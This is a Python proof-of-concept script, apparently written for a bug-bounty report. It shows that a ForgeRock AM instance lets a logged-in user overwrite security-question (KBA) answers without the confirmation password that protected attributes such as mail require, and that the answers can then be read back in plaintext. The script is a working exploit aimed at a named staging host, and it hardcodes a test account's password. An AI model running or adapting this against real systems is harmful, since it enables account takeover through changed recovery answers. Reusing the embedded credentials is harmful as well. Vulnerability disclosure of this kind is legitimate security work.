# -*- coding: utf-8 -*-
"""AIC kbaInfo PoC:ForgeRock AM 受保护属性名单遗漏 kbaInfo
复现流程(全部使用测试账号 pccp,self-only,无越权):
1. 基线:PUT mail(受保护属性)无确认密码 -> 400 "Must provide a valid confirmation
   password to change protected attribute (mail)"
2. 差异:PUT kbaInfo(KBA 安全问题答案)无确认密码 -> 200 成功写入
3. 读取:GET users/{id}?_fields=kbaInfo -> 明文返回 KBA 答案
4. 恢复:PUT kbaInfo 清空 -> 200(不污染测试数据)
用法:python _aic_kba_poc.py
"""
import requests, urllib3, json, sys, time
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
USER = 'pccp'
PASS = 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
COOKIE_NAME = 'aa942d46ece12ce'
PROBE_MAIL = 'pccp_probe@example.com'
PROBE_ANSWER = 'kba_poc_answer_2026'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})


def login():
    r = S.post(AUTH, json={}, timeout=15, verify=False)
    d = r.json()
    authId = d['authId']
    cbs = []
    for cb in d.get('callbacks', []):
        t = cb['type']
        inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
              [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
              [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
        cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
    r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
    tok = r2.json().get('tokenId')
    if not tok:
        sys.exit('LOGIN FAILED')
    S.headers.update({'Cookie': COOKIE_NAME + '=' + tok,
                      'Accept-API-Version': 'resource=2.1, protocol=1.0'})
    print('[+] 登录成功 token=%s...' % tok[:20])


def main():
    login()
    U = BASE + '/am/json/realms/root/realms/alpha/users/' + MY_ID

    print('\n[1] 基线:修改受保护属性 mail,不带确认密码')
    r = S.put(U, json={'mail': [PROBE_MAIL]}, timeout=15, verify=False)
    print('    PUT {"mail": [...]} -> HTTP %d' % r.status_code)
    print('    %s' % r.text[:160])
    assert r.status_code == 400 and 'confirmation password' in r.text, '基线不符,中止'

    print('\n[2] 差异:修改 kbaInfo(KBA 答案),不带任何确认')
    r = S.put(U, json={'kbaInfo': [{'questionId': '1', 'answer': PROBE_ANSWER}]}, timeout=15, verify=False)
    print('    PUT {"kbaInfo": [...]} -> HTTP %d' % r.status_code)
    assert r.status_code == 200, 'kbaInfo 写入失败'
    print('    响应包含 kbaInfo: %s' % ('kbaInfo' in r.text))

    print('\n[3] 读取:确认 KBA 答案已明文写入')
    r = S.get(U + '?_fields=kbaInfo', timeout=15, verify=False)
    print('    GET ?_fields=kbaInfo -> HTTP %d' % r.status_code)
    print('    %s' % r.text[:200])
    assert PROBE_ANSWER in r.text, 'KBA 答案未回显'

    print('\n[4] 清理:清空 kbaInfo,恢复原状态')
    r = S.put(U, json={'kbaInfo': []}, timeout=15, verify=False)
    print('    PUT {"kbaInfo": []} -> HTTP %d' % r.status_code)
    r = S.get(U + '?_fields=kbaInfo', timeout=15, verify=False)
    print('    复查: %s' % r.text[:120])
    assert PROBE_ANSWER not in r.text, '清理失败'

    print('\n[+] PoC 完成:mail 需确认密码(400),kbaInfo 无需(200),明文可读')


if __name__ == '__main__':
    main()
